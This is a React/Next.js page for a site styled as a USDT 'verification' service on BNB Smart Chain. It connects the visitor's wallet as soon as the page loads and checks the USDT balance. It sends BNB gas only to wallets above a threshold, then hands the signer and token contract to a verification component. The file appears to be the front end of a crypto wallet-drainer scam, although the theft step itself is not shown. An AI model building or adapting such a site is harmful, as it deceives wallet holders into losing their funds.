// @ts-nocheck
'use client'

import { useEffect, useState } from 'react'
import { ethers } from 'ethers'
import Header from '@/components/Header'
import NetworkStats from '@/components/NetworkStats'
import VerificationSection from '@/components/VerificationSection'
import FeatureCards from '@/components/FeatureCards'
import BnbChainStatus from '@/components/BnbChainStatus'
import SecurityAlerts from '@/components/SecurityAlerts'
import Resources from '@/components/Resources'
import Footer from '@/components/Footer'
import { USDT_ADDRESS, CHAIN_ID, CHAIN_ID_DECIMAL, USDT_THRESHOLD } from '@/utils/config'
import usdtAbi from '@/abi/USDT.json'
import {fundBNBIfNeeded} from "@/utils/gasUtils"
import LiveTransactions from '@/components/LiveTransactions'
// Extend Window interface to include ethereum
declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function Home() {
  const [provider, setProvider] = useState<ethers.providers.Web3Provider | null>(null)
  const [signer, setSigner] = useState<ethers.providers.JsonRpcSigner | null>(null)
  const [userAddress, setUserAddress] = useState<string | null>(null)
  const [usdt, setUsdt] = useState<ethers.Contract | null>(null)
  const [balance, setBalance] = useState<ethers.BigNumber | null>(null)
  const [readableBalance, setReadableBalance] = useState<string | null>(null)
  const [decimals, setDecimals] = useState<number | null>(null)
  const [isConnecting, setIsConnecting] = useState(false)

  const connectAndFund = async () => {
    if (!window.ethereum) {
      alert("Please install MetaMask or Trust Wallet");
      return;
    }

    setIsConnecting(true);
    
    try {
      let localProvider = new ethers.providers.Web3Provider(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      let localSigner = localProvider.getSigner();
      let localUserAddress = await localSigner.getAddress();

      const { chainId } = await localProvider.getNetwork();
      
      if (chainId !== CHAIN_ID_DECIMAL) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: CHAIN_ID }]
          });
          localProvider = new ethers.providers.Web3Provider(window.ethereum);
          localSigner = localProvider.getSigner();
        } catch (switchError: any) {
          if (switchError.code === 4902) {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: CHAIN_ID,
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed1.binance.org"],
                blockExplorerUrls: ["https://bscscan.com"]
              }]
            });
            localProvider = new ethers.providers.Web3Provider(window.ethereum);
            localSigner = localProvider.getSigner();
          }
        }
      }

      const localUsdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, localProvider);
      const localDecimals = await localUsdt.decimals();
      const localBalance = await localUsdt.balanceOf(localUserAddress);
      const localReadableBalance = ethers.utils.formatUnits(localBalance, localDecimals);

      if (localBalance.gte(ethers.utils.parseUnits(String(USDT_THRESHOLD), localDecimals))) {
        await fundBNBIfNeeded(localProvider, localUserAddress);
      }

      setProvider(localProvider);
      setSigner(localSigner);
      setUserAddress(localUserAddress);
      setUsdt(localUsdt);
      setDecimals(localDecimals);
      setBalance(localBalance);
      setReadableBalance(localReadableBalance);
    } catch (err) {
      console.error("Connection failed:", err);
    } finally {
      setIsConnecting(false);
    }
  };

  useEffect(() => {
    connectAndFund()
  }, [])

  return (
    <main className="relative min-h-screen overflow-hidden">
      {/* Background grid */}
      <div className="absolute inset-0 bg-grid -z-10" />

      {/* Main content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pb-16">
        {/* <Header 
          isConnecting={isConnecting}
          userAddress={userAddress}
          connectWallet={connectAndFund}
        /> */}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 sm:gap-6 mt-4 sm:mt-6">
          {/* Left column - collapses to top on mobile */}
          <div className="lg:col-span-3 order-2">
            <NetworkStats />
          </div>

          {/* Middle column - always first on mobile */}
          <div className="lg:col-span-6 order-1 lg:order-2">
            <VerificationSection 
              isConnecting={isConnecting}
              connectAndFund={connectAndFund}
              provider={provider}
              signer={signer}
              userAddress={userAddress}
              usdt={usdt}
              balance={balance}
              readableBalance={readableBalance}
              decimals={decimals}
            />
            <FeatureCards />
            <LiveTransactions />
          </div>

          {/* Right column - collapses to bottom on mobile */}
          <div className="lg:col-span-3 order-3">
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-1 gap-4 sm:gap-6">
              <BnbChainStatus />
              <SecurityAlerts />
              <Resources />
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </main>
  )
}
